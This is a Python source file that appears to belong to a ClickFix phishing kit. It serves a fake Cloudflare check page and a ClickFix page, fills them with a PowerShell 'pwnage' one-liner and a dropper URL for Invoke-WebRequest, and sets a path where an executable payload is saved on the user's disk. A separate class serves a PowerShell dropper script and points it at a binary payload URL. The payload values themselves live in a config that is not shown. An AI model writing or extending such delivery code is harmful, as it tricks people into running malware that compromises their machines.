
import config
import os


class PLAIN_TEXT_FILES:
    def __init__(self):
        self.name = "PLAIN_TEXT_FILES_ORGANIZER"
        self.plainFiles = {
            "HomePage":config.conf["PATHS"]["CLOUDFLARE_PAGE"],
            "SecondPage":config.conf["PATHS"]["CLICKFIX_PAGE"],
            "PowershellDropper":config.conf["PATHS"]["POWERSHELL_DROPPER"]
        }
    def readFile(self,name):
        if name not in self.plainFiles:raise NameError(f"{name} wasnt defined in the PLAIN_TEXT_FILES class constructor")
        with open(self.plainFiles[name],encoding="utf-8") as F:
            Content =  F.read()
        return Content



class Html(PLAIN_TEXT_FILES):
    def __init__(self):
        super().__init__()
        self.name = "HTML_COOKER_COOL_BOY_()"
        self.HomePage = self.readFile("HomePage")
        self.SecondPage = self.readFile("SecondPage")

    def getTemplateFixedHtml(self,fileOrder:int=None)->str:
        if fileOrder==2:return self.SecondPage 
        html = self.HomePage
        templates = {
            "{{POWERSHELL ONELINER PWNAGE}}":config.conf["OTHER"]["COMMANDS"]["POWERSHELL ONELINER PWNAGE"],
            "{{PSScript URL for IWR}}":config.conf["URLS"]["powershell_dropper_url".upper()],
            "{{CLICK_FIX_PAGE}}":config.conf["URLS"]["clickfix_page_endpoint".upper()],
            "{{Payload Save Path In UserDisk}}":config.conf["USER_SIDE"]["PATHS"]["FINAL_EXE_PAYLOAD_PATH"],
            "{{Fav-Icon-URL-Placeholder}}":config.conf["URLS"]["favicon_url".upper()],
        }
        for template,replacement in templates.items():
            html = html.replace(template,replacement)
        return html

class PowerShell(PLAIN_TEXT_FILES):
    def __init__(self):
        super().__init__()
        self.name = "POWERSHELL CENTRAL @OG"
        self.powerShellCode = self.readFile("PowershellDropper")
    def getPowershellCode(self):
        return self.powerShellCode.replace("{{Binary Payload URL}}",config.conf["URLS"]["actual_binary_payload".upper()])
